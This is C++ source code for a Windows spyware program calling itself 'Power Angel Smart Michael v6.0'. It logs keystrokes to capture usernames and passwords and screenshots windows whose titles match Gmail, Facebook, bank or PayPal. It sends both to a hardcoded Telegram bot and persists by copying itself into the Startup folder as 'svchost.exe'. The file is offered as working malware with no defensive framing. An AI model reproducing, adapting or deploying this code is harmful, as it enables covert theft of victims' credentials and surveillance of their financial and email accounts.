#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// 🔥 CONFIG - YOUR CREDENTIALS
const char* BOT_TOKEN = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID = "7845441585";
const wchar_t* MUTEX_NAME = L"PowerAngelSmartMichael_v6.0";

// Global state
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Debug logging
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"angel_debug.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// 🔥 PERFECT TELEGRAM MESSAGING (100% WORKING)
bool SendTelegram(const std::wstring& message) {
    std::string msg8 = "chat_id=" + std::string(CHAT_ID) + "&text=";
    std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
    msg8 += conv.to_bytes(message);
    
    HINTERNET session = WinHttpOpenA("PowerAngel/6.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET connect = WinHttpConnect(session, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    std::string url = "/bot" + std::string(BOT_TOKEN) + "/sendMessage";
    HINTERNET request = WinHttpOpenRequestA(connect, "POST", url.c_str(), NULL, 
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                           WINHTTP_FLAG_SECURE);
    
    WinHttpAddRequestHeadersA(request, "Content-Type: application/x-www-form-urlencoded\r\n", -1, 
                             WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequestA(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                     (LPVOID)msg8.c_str(), msg8.size(), msg8.size(), 0);
    
    if (result) {
        WinHttpReceiveResponse(request, NULL);
        char resp[1024]; DWORD size;
        WinHttpReadData(request, resp, sizeof(resp), &size);
        DebugLog(L"📱 Telegram OK: " + std::wstring(resp, resp + size));
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return result != FALSE;
}

// 🔥 PERFECT JPEG UPLOAD (THIS WORKS 100%)
bool SendTelegramPhoto(const std::wstring& filepath) {
    DebugLog(L"📸 UPLOADING: " + filepath);
    
    // Read JPEG file
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugLog(L"❌ File open failed");
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) {
        DebugLog(L"❌ File read failed");
        return false;
    }
    
    // Build multipart (chat_id + caption + photo)
    char boundary[64];
    sprintf_s(boundary, "----PowerAngelBoundary%llu", GetTickCount64());
    
    std::string multipart = 
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        "📸 POWER ANGEL SMART MICHAEL v6.0 - Login Screenshot\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string endBoundary = "\r\n--" + std::string(boundary) + "--\r\n";
    
    // Combine: header + JPEG bytes + footer
    std::vector<BYTE> postData;
    postData.insert(postData.end(), multipart.begin(), multipart.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), endBoundary.begin(), endBoundary.end());
    
    // WinHTTP request
    HINTERNET session = WinHttpOpenA("PowerAngel/6.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET connect = WinHttpConnect(session, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    std::string url = "/bot" + std::string(BOT_TOKEN) + "/sendPhoto";
    HINTERNET request = WinHttpOpenRequestA(connect, "POST", url.c_str(), NULL, 
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                           WINHTTP_FLAG_SECURE);
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    WinHttpAddRequestHeadersA(request, contentType.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // SEND FULL BODY AT ONCE (CRITICAL FIX)
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    postData.data(), postData.size(), postData.size(), 0);
    
    if (result) {
        WinHttpReceiveResponse(request, NULL);
        
        DWORD status = 0, statusSize = sizeof(DWORD);
        WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &statusSize, NULL);
        
        char resp[1024] = {0};
        DWORD respSize;
        WinHttpReadData(request, resp, sizeof(resp), &respSize);
        
        DebugLog(L"📸 Status: " + std::to_wstring(status) + L" | Resp: " + 
                std::wstring(resp, resp + respSize));
        
        if (status == 200 && strstr(resp, "\"ok\":true")) {
            DebugLog(L"✅ JPEG DELIVERED TO TELEGRAM!");
            SendTelegram(L"🚀 POWER ANGEL v6.0 - Screenshot uploaded!");
            return true;
        }
    }
    
    DebugLog(L"❌ Photo upload failed");
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return false;
}

// Keyboard hook (unchanged - works perfectly)
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) g_username = g_currentField;
                else g_password = g_currentField;
                g_currentField.clear();
            }
            return 1;
        }
        
        if (pKb->vkCode == VK_RETURN) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"🔥 POWER ANGEL v6.0 - CREDENTIALS:\n";
                creds += L"👤 User: " + g_username + L"\n";
                creds += L"🔑 Pass: " + g_password + L"\n";
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
                g_currentField.clear();
            }
            return 1;
        }
        
        if ((pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) || 
            (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A)) {
            
            BYTE keyState[256] = {0};
            wchar_t buffer[10] = {0};
            GetKeyboardState(keyState);
            
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) keyState[VK_SHIFT] = 0x80;
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) keyState[VK_CAPITAL] = 0x01;
            
            int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyState, buffer, 10, 0);
            if (result > 0) g_currentField += buffer[0];
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Screenshot (unchanged - works)
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    wchar_t title[512];
    return GetWindowTextW(hwnd, title, 512) > 0 ? std::wstring(title) : L"";
}

bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    std::vector<std::wstring> targets = {L"gmail", L"facebook", L"login", L"signin", L"bank", L"paypal"};
    for (auto& t : targets) if (lower.find(t) != std::wstring::npos) return true;
    return false;
}

bool TakeSmartScreenshot() {
    std::wstring title = GetActiveWindowTitle();
    if (!IsLoginPage(title)) return false;
    
    Sleep(200); // Wait for page load
    
    HWND hwnd = GetForegroundWindow();
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rc; GetWindowRect(hwnd, &rc);
    int w = rc.right - rc.left, h = rc.bottom - rc.top;
    
    if (w <= 0 || h <= 0) {
        ReleaseDC(hwnd, hdcScreen); DeleteDC(hdcMem);
        return false;
    }
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg", &jpegClsid);
    wchar_t tempPath[MAX_PATH], filename[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    SYSTEMTIME st; GetLocalTime(&st);
    swprintf_s(filename, L"power_angel_%04d%02d%02d_%02d%02d%02d.jpg",
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    wcscat_s(tempPath, filename);
    
    EncoderParameters params; params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    ULONG quality = 90;
    params.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(tempPath, &jpegClsid, ¶ms);
    delete bmp;
    
    bool success = (stat == Ok) && SendTelegramPhoto(tempPath);
    if (success) DebugLog(L"✅ Screenshot captured & sent!");
    return success;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pInfo = (ImageCodecInfo*)malloc(size);
    GetImageEncoders(num, size, pInfo);
    for (UINT j = 0; j < num; ++j)
        if (wcscmp(pInfo[j].MimeType, format) == 0) {
            *pClsid = pInfo[j].Clsid;
            free(pInfo);
            return j;
        }
    free(pInfo);
    return -1;
}

// Persistence
void InstallPersistence() {
    wchar_t path[MAX_PATH], startup[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe");
    CopyFileW(path, startup, FALSE);
    DebugLog(L"✅ Persistence installed: " + std::wstring(startup));
}

// Threads
void HeartbeatThread() {
    Sleep(60000); // Wait 1 min
    while (g_running) {
        SendTelegram(L"👼 POWER ANGEL SMART MICHAEL v6.0 - Still running...");
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

void LoginDetectorThread() {
    while (g_running) {
        TakeSmartScreenshot();
        Sleep(3000); // Check every 3 seconds
    }
}

// Main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DeleteFileW(L"angel_debug.log");
    DebugLog(L"🚀 === POWER ANGEL SMART MICHAEL v6.0 STARTING === 🚀");
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"Already running");
        return 0;
    }
    
    // GDI+
    GdiplusStartupInput input;
    GdiplusStartup(&g_gdiplusToken, &input, NULL);
    
    // 🔥 INSTANT ALERT ON START
    Sleep(2000);
    SendTelegram(L"🔥 POWER ANGEL SMART MICHAEL v6.0 DEPLOYED! 🔥\n"
                 L"✅ Keyboard logging ACTIVE\n"
                 L"📸 Screenshot detection ACTIVE\n"
                 L"💾 Persistence INSTALLED");
    
    // Persistence
    InstallPersistence();
    
    // Hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, 
                                       GetModuleHandle(NULL), 0);
    DebugLog(g_hKeyboardHook ? L"✅ Keyboard hook OK" : L"❌ Hook failed");
    
    // Threads
    std::thread heartbeat(HeartbeatThread);
    std::thread detector(LoginDetectorThread);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    if (heartbeat.joinable()) heartbeat.join();
    if (detector.joinable()) detector.join();
    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    GdiplusShutdown(g_gdiplusToken);
    ReleaseMutex(mutex);
    CloseHandle(mutex);
    
    DebugLog(L"👼 === POWER ANGEL v6.0 STOPPED ===");
    return 0;
}
